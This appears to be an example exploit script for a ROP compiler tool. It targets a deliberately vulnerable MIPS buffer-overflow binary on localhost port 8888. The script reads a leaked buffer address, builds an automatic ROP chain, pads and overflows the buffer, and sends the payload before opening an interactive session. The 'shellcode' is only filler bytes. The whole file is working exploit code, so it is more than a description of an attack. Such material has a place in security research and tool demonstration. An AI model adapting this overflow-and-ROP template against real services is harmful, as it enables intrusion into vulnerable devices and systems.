import sys, logging
import archinfo
from pwn import *
from rop_compiler import ropme

filename = './example/mips_bof'
p = remote('localhost', 8888)

buffer_address = struct.unpack("<I", p.read(4))[0]

shellcode = (
    "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
  + "\x41\x42\x43\x44"
)
target_address = buffer_address + 700
print "shellcode ({} bytes) address: 0x{:x}".format(len(shellcode), target_address)

print "Using automatically built ROP chain"
rop = ropme.rop_to_shellcode([(filename, None, 0)], [], target_address, archinfo.ArchMIPS32('Iend_BE'), logging.DEBUG)

payload = 'A'*512 + 'B'*4 + rop
payload += ((700 - len(payload)) * 'B') + shellcode
payload += "JEFF" # To end our input

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline(payload)
p.interactive()
